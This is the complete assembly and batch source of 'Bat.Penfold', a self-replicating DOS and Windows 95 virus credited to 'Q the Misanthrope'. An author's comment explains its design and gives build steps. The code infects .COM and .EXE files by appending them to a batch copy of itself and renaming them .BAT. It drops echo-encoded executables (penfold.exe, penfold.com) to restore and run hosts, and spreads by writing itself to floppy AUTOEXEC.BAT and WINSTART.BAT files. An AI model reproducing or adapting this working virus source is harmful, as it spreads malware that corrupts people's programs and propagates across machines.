;              'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
;               º *******:::: Bat.Penfold Virus ::::****** º
;               º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
;               º ****** -= "Q" the Misanthrope =- ******* º
;              'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'


comment         @

The Bat.Penfold Virus by "Q" the Misanthrope

This virus was named after Danger Mouse's idiotic sidekick: Penfold.  Both
Penfold and this virus are useless but slightly amusing at times.

This strange virus exploits the "copy /a" command.  The virus essentially is a
batch file virus.  The batch file has a CTRL-Z at the end of the file.  It
chooses it's victom (*.COM *.EXE) and appends the executable program to the
batch file past the CTRL-Z.  So it turns the *.COM or *.EXE file into a *.BAT
file.  The batch file never executes past the CTRL-Z so the program never gets
executed as batch code.  It creates a C:\Penfold.COM file that turns it back
to an executable program and executes it.  It does has traveling capabilities.
Whenever an infected program has A: or B: as it's first parameter, the virus
copies itself to A: or B: as \AUTOEXEC.BAT and \WINSTART.BAT.  When booting
from floppy, AUTOEXEC.BAT copies itself to the new host as C:\WINSTART.BAT.
Works well with Windoze 95 or DOS.

A special thanks goes to Herbert Kleebauer for his Hex2Bin convertor.  

tasm penfold /m2
tlink /t penfold
ren penfold.com penfold.bat
penfold

                @

page


qseg            segment para    public  'code'
simple		proc	far
assume          cs:qseg,es:qseg,ds:qseg

.286
org		100h


begin:
                db      '@echo off',0dh,0ah
                db      'if "%0==" goto qauto',0dh,0ah
                db      'if "%1=="qe2 goto %1',0dh,0ah
                db      'for %%q in (%0 %winbootdir%\command\%0 c:\dos\%0) do %comspec% nul /f/cif not exist c:\penfold.bat copy/a %%q+%%q.bat c:\penfold.bat',0dh,0ah
                db      'rem Bat.Penfold by "Q" | %comspec% nul /f/e:4096/cc:\penfold.bat qe2 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9',0dh,0ah
                db      'del c:\penfold.*',0dh,0ah
                db      'goto qend',0dh,0ah
                db      ':qauto',0dh,0ah
                db      'if exist c:nul copy \autoexec.bat c:\winstart.bat>nul',0dh,0ah
                db      '%comspec%',0dh,0ah
                db      'goto qend',0dh,0ah
                db      ':qe2',0dh,0ah
                db      'for %%q in (%path%) do if %%q==C:\DOS set qdir=%%q',0dh,0ah
                db      'for %%q in (%path%) do if %%q==%winbootdir%\COMMAND set qdir=%%q',0dh,0ah
                db      'if "%qdir%==" goto qend',0dh,0ah
                db      'for %%q in (%qdir%\*.exe %qdir%\*.com) do set q=%%q',0dh,0ah
                db      'if "%q%==" goto qdone',0dh,0ah
                db      'copy/b %q% c:\penfold.new',0dh,0ah
                db      'copy/b c:\penfold.bat+c:\penfold.new %q%',0dh,0ah
                db      'ren %q% *.bat',0dh,0ah
                db      ':qdone',0dh,0ah
                db      'echo j@X$!PZRYI4~@@P]hWDX-a!-a!P[1/hrDX-a!-a!P[1/h#DX-a!-a!P[1/>c:\penfold.exe',0dh,0ah
                db      'echo @hsDX-a!-a!P[@@PP_R]!/3-GWX=zzwWUX,!rlUX$O$/P]1/Q]3/E)/Q]3/>>c:\penfold.exe',0dh,0ah
                db      'echo @E)/Q]3/E)/Q]3/E)/R]3-GUX,!ruUX$O$/P]1/^R]!,3/1,FVRX,0r/xx>>c:\penfold.exe',0dh,0ah
                db      'echo kmooook43o31mkk90100kj1402lm21723n09l07447j01402>>c:\penfold.exe',0dh,0ah
                db      'echo 3l3072n73l3977042l30nk0l0l203l6172m93l6677m52l57>>c:\penfold.exe',0dh,0ah
                db      'echo o7mm7808l0n004j21502nkl700061502k440kk0100k90100>>c:\penfold.exe',0dh,0ah
                db      'echo kj1502lm2173k4k440kk0200k91400kj1602lm21k8004llm>>c:\penfold.exe',0dh,0ah
                db      'echo 2100006665686l657220617566676574726574656n0m0j>>c:\penfold.exe',0dh,0ah

comment         @

This bit of code is compiled separately and then debugged to obtain the
hexadecimal text that is output to C:\penfold.txt and then piped through
c:\penfold.exe to obtain c:\penfold.com

page
qseg            segment para    public  'code'
simple		proc	far
assume          cs:qseg,es:qseg,ds:qseg
.286
org		100h
begin:          mov     si,80h
                push    word ptr ds:[si]        ;get file name passed to it
                lea     dx,word ptr ds:[si+02h]
look_for_it:    inc     si
                cmp     byte ptr ds:[si],"."
                jne     look_for_it
                xor     di,di
                xchg    word ptr ds:[si+04h],di ;nul terminate it
                mov     ax,3d40h                ;open file *.bat
		int     21h
                mov     word ptr ds:[si+01h],"XE"
                mov     byte ptr ds:[si+03h],"E"
		xchg    ax,bx
                push    dx
                mov     ax,4200h                ;lseek past CTRL-Z
		xor     cx,cx                   ;normal attributes
                mov     dx,0855h                ;VERY IMPORTANT (offest of
                int     21h                     ;byte past CTRL-Z in batch
                pop     dx                      ;file
                mov     ax,5b00h                ;create a file *.exe
		int     21h
		xchg    ax,bp
loop_copy:      push    bx
                mov     ah,3fh                  ;read *.bat
                mov     dx,offset buffer
                mov     ch,02h                  ;512 bytes at a time
		int     21h
		xchg    ax,cx
                mov     ah,40h                  ;write to *.exe
		mov     bx,bp
		int     21h
		or      ax,ax                   ;zero bytes written?
                pop     bx
		jnz     loop_copy               ;if not then continue
                mov     ah,3eh                  ;close the *.exe file
		int     21h
                mov     bx,bp
                mov     ah,3eh                  ;close the *.bat file
		int     21h
                xchg    word ptr ds:[si+04h],di ;undo nul termination
		mov	bx,30h
                mov     ah,4ah
                int     21h
                pop     bx
                xor     bh,bh
                mov     bp,0a0dh                ;prepare for INT 2E
                mov     word ptr ds:[bx+81h],bp
                lea     cx,word ptr ds:[bx-01h]
                mov     si,0081h
                mov     byte ptr ds:[si],cl
                int     2eh
                push    cs
                pop     ds
                mov     si,80h
                lea     dx,word ptr ds:[si+02h] ;re-get file name
look_for_it2:   inc     si
                cmp     byte ptr ds:[si],"."
                jne     look_for_it2
                mov     byte ptr ds:[si+04h],00h;nul terminate it
retry_kill:     mov     ah,41h                  ;kill exe file
                int     21h
                jc      retry_kill
                mov     ah,4dh                  ;get errorlevel of exe
                int     21h
                mov     ah,4ch                  ;close with same errorlevel
                int     21h
buffer          equ     $
simple		endp
qseg            ends
end		begin

                @

                db      'echo BE8000FF348D540246803C2E75FA33FF877C04B8403DCD21C744014558>c:\penfold.txt',0dh,0ah
                db      'echo C64403459352B8004233C9BA5508CD215AB8005BCD219553B43FBA9201>>c:\penfold.txt',0dh,0ah
;       Lenth of batch file minus 2 bytes goes here --^  The lenth is 0855h bytes 
                db      'echo B502CD2191B4408BDDCD210BC05B75EAB43ECD218BDDB43ECD21877C04>>c:\penfold.txt',0dh,0ah
                db      'echo BB3000B44ACD215B32FFBD0D0A89AF81008D4FFFBE8100880CCD2E0E1F>>c:\penfold.txt',0dh,0ah
                db      'echo BE80008D540246803C2E75FAC6440400B441CD2172FAB44DCD21B44CCD21>>c:\penfold.txt',0dh,0ah
                db      'c:\penfold.exe<c:\penfold.txt>c:\penfold.com',0dh,0ah
                db      'if not "%3==" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\penfold.bat %%q\autoexec.bat',0dh,0ah
                db      'if not "%3==" for %%q in (a: A: b: B:) do if %3==%%q %comspec% nul /f/ccopy/b c:\penfold.bat %%q\winstart.bat',0dh,0ah
                db      'for %%q in (%qdir%\%2 %qdir%\%2.bat) do if exist %%q %comspec% con /cc:\penfold.com %%q %3 %4 %5 %6 %7 %8 %9',0dh,0ah
                db      'set qdir=',0dh,0ah
                db      'set q=',0dh,0ah
                db      'exit',0dh,0ah
                db      ':qend',0dh,0ah
                db      1ah
                int     20h

simple		endp
qseg            ends

end		begin
